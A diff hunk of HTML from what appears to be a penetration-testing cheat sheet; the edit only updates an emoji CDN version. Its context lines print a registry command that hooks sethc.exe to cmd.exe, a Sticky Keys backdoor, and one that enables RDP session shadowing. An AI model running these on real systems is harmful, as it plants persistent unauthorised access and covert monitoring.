@@ -6961,7 +6961,7 @@
 <div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="n">REG</span> <span class="n">ADD</span> <span class="s2">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot;</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_SZ</span> <span class="p">/</span><span class="n">v</span> <span class="n">Debugger</span> <span class="p">/</span><span class="n">d</span> <span class="s2">&quot;C:\windows\system32\cmd.exe&quot;</span> <span class="p">/</span><span class="n">f</span>
 </code></pre></div>
 <h3 id="remote-desktop-services-shadowing">Remote Desktop Services Shadowing</h3>
-<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/26a0.svg" title=":warning:" /> FreeRDP and rdesktop don't support Remote Desktop Services Shadowing feature.</p>
+<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/svg/26a0.svg" title=":warning:" /> FreeRDP and rdesktop don't support Remote Desktop Services Shadowing feature.</p>
 <p>Requirements:
 * RDP must be running</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="n">reg</span> <span class="n">add</span> <span class="s2">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services&quot;</span> <span class="p">/</span><span class="n">v</span> <span class="n">Shadow</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="p">/</span><span class="n">d</span> <span class="n">4</span>
